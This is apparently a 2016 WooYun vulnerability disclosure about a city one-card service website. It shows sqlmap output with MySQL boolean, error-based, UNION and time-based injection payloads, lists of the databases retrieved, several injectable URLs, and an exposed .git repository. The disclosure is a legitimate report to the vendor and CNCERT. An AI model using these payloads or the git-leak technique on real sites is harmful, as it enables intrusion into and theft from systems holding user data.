wybug_title: 某市一卡通存在大量sql注入/服务配置不当
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail: 漏洞详情 披露状态：   									2016-01-16：	细节已通知厂商并且等待厂商处理中									2016-01-20：	厂商已经确认，细节仅向厂商公开									2016-01-30：	细节向核心白帽子及相关领域专家公开									2016-02-09：	细节向普通白帽子公开									2016-02-19：	细节向实习白帽子公开									2016-03-05：	细节向公众公开  简要描述： 。。。。。。。。。我记得我2年前搞这个站的时候还是甲骨文的数据库，现在变成mysql了。 详细说明：  http://**.**.**.**/news/news?city=1301&id=492[17:17:16] [INFO] GET parameter 'city' is 'MySQL UNION query (random number) - 1 to 20 columns' injectableGET parameter 'city' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 87 HTTP(s) requests:---Parameter: city (GET)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: city=1301) RLIKE (SELECT (CASE WHEN (1561=1561) THEN 1301 ELSE 0x28 END)) AND (6250=6250&id=492    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: city=1301) AND (SELECT 9489 FROM(SELECT COUNT(*),CONCAT(0x71707a7a71,(SELECT (CASE WHEN (9489=9489) THEN 1 ELSE 0 END)),0x717a6b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (8884=8884&id=492    Type: UNION query    Title: MySQL UNION query (random number) - 2 columns    Payload: city=-2145) UNION ALL SELECT 9571,CONCAT(0x71707a7a71,0x627a5778644972444d45,0x717a6b7871)#&id=492    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: city=-9863) OR 7767=SLEEP(5) AND (8061=8061&id=492---[17:35:43] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.0[17:35:43] [INFO] fetching database names[17:35:43] [WARNING] the SQL query provided does not return any output[17:35:43] [INFO] the SQL query used returns 14 entries[17:35:43] [INFO] retrieved: information_schema[17:35:43] [INFO] retrieved: card[17:35:44] [INFO] retrieved: card_center[17:35:44] [INFO] retrieved: card_test[17:35:44] [INFO] retrieved: card_test_center[17:35:44] [INFO] retrieved: game[17:35:44] [INFO] retrieved: hbdb[17:35:48] [INFO] retrieved: mysql[17:35:48] [INFO] retrieved: t_etc_truck[17:35:51] [INFO] retrieved: test[17:35:51] [INFO] retrieved: weixinyikatong[17:35:51] [INFO] retrieved: yikatong[17:35:52] [INFO] retrieved: yktweb[17:35:52] [INFO] retrieved: yktwebbakavailable databases [14]:[*] card[*] card_center[*] card_test[*] card_test_center[*] game[*] hbdb[*] information_schema[*] mysql[*] t_etc_truck[*] test[*] weixinyikatong[*] yikatong[*] yktweb[*] yktwebbak   漏洞证明：  http://**.**.**.**/card/index?type=4&cityId=1301http://**.**.**.**/business/business?bid=7720&aid=2327&cityId=1301http://**.**.**.**/business/list?cityId=1301http://**.**.**.**/company/detail?city=1301&id=2http://**.**.**.**/help/list?type=8http://**.**.**.**/business/business?cityId=1301&aid=1469&bid=6643http://**.**.**.**/business/list?cityId=1301http://**.**.**.**/company/detail?city=1301&id=1http://**.**.**.**/?cityId=1301全是SQL注入，用的thinkphp的框架。 http://**.**.**.**/.git/configgit泄漏。https://**.**.**.**/huanglifen/yktweb可以直接下载代码。但是没有数据库。   修复方案：  结构化查询，删除.git。   版权声明：转载请注明来源 陆由乙@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-20 09:57 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给河北分中心,由其后续协调网站管理单位处置. 最新状态： 暂无
